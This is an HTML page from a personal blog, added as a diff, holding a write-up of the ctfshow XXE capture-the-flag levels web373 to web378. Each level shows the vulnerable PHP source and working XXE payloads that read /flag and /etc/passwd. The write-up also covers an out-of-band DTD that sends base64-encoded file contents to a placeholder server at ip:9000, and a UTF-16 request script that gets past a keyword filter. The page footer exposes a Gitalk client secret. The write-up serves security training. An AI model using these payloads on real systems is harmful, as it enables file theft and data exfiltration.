@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]XXE | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web373
+源码
+&lt;?php
+
+error_reporting(0);
+// 允许加载外部实体
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents('p..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]XXE</h2>
+            <div class="post-date">2024-06-04</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowxxe.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web373">web373</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+// 允许加载外部实体
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents('php://input');
+if(isset($xmlfile)){
+    $dom = new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+    $creds = simplexml_import_dom($dom);
+    $ctfshow = $creds-&gt;ctfshow;
+    echo $ctfshow;
+}
+highlight_file(__FILE__);    
+
+</code></pre>
+<p>payload</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; ]&gt;
+&lt;creds&gt;
+&lt;ctfshow&gt;
+&amp;xxe;
+&lt;/ctfshow&gt;
+&lt;/creds&gt;
+</code></pre>
+<p>这里发现version后随便加数字也行，第二层标签也不是必须是creds。</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.012313&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; ]&gt;
+&lt;fff&gt;
+&lt;ctfshow&gt;
+&amp;xxe;
+&lt;/ctfshow&gt;
+&lt;/fff&gt;
+</code></pre>
+<h2 id="web374">web374</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents('php://input');
+if(isset($xmlfile)){
+    $dom = new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+}
+highlight_file(__FILE__);    
+
+</code></pre>
+<p>服务器端无回显<br>
+参考文章https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band</p>
+<p>自己服务器端malicious.dtd</p>
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://ip:9000/?x=%file;'&gt;&quot;&gt;
+%eval;
+%exfiltrate;
+</code></pre>
+<p>这里因为读的文件内有换行符，不会触发http。<br>
+可以使用php伪协议，将数据转为base64</p>
+<pre><code class="language-xml">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;
+&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://ip:9000/?x=%file;'&gt;&quot;&gt;
+%eval;
+%exfiltrate;
+</code></pre>
+<p>使用python的http.server布置</p>
+<pre><code class="language-shell">python3 -m http.server 9000
+</code></pre>
+<p>payload</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ENTITY % remote SYSTEM &quot;http://ip:9000/malicious.dtd&quot;&gt;
+%remote;
+]&gt;
+</code></pre>
+<h2 id="web375">web375</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents('php://input');
+if(preg_match('/&lt;\?xml version=&quot;1\.0&quot;/', $xmlfile)){
+    die('error');
+}
+if(isset($xmlfile)){
+    $dom = new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+}
+highlight_file(__FILE__);    
+</code></pre>
+<p>同上，将版本改为1.1即可。</p>
+<h2 id="web376">web376</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents('php://input');
+if(preg_match('/&lt;\?xml version=&quot;1\.0&quot;/i', $xmlfile)){
+    die('error');
+}
+if(isset($xmlfile)){
+    $dom = new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+}
+highlight_file(__FILE__);   
+</code></pre>
+<p>同上</p>
+<h2 id="web377">web377</h2>
+<p>源码</p>
+<pre><code class="language-php">&lt;?php
+
+error_reporting(0);
+libxml_disable_entity_loader(false);
+$xmlfile = file_get_contents('php://input');
+if(preg_match('/&lt;\?xml version=&quot;1\.0&quot;|http/i', $xmlfile)){
+    die('error');
+}
+if(isset($xmlfile)){
+    $dom = new DOMDocument();
+    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
+}
+highlight_file(__FILE__); 
+</code></pre>
+<p>这里过滤了http，使用utf-16编码绕过</p>
+<pre><code class="language-python">import requests
+url = 'http://66634293-0716-44a3-b08b-48e97c715caa.challenge.ctf.show'
+
+data = '''&lt;?xml version=&quot;1.1&quot;?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ENTITY % remote SYSTEM &quot;http://ip:9000/malicious.dtd&quot;&gt;
+%remote;
+]&gt;'''
+
+proxies = {
+  'http': 'http://127.0.0.1:8080',
+}
+//设置burp代理，查看详细数据包
+print(data.encode('utf-16'))
+
+r= requests.post(url=url,data=data.encode(&quot;utf-16&quot;),proxies=proxies)
+print(r.text)
+</code></pre>
+<h2 id="web378">web378</h2>
+<p>一个登录框，抓包发现上传数据为xml格式，且会回显用户名。</p>
+<p>payload</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; ]&gt;
+&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;333&lt;/password&gt;&lt;/user&gt;
+</code></pre>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowssti/">
+                  <h3 class="post-title">
+                    [ctfshow]SSTI
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
